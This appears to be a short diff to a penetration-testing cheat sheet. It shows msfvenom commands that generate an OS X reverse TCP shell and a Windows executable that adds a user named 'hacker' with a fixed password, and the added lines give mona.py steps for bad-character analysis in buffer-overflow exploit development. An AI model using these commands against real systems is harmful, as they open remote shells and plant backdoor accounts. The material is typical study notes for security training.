@@ -2805,3 +2805,12 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port
 
 Create User
 msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe
+
+
+BOF using mona.py compare
+
+01CBA154 = address of after the EIP memory
+
+!mona compare -f C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin -a 01CBA154(address of the start of your badchar placement)
+
+!mona bytearray -cpb "\x00\x0a\x0d" <=== specify the badchar to be remove from the bytearray and rerun again until no badchar found
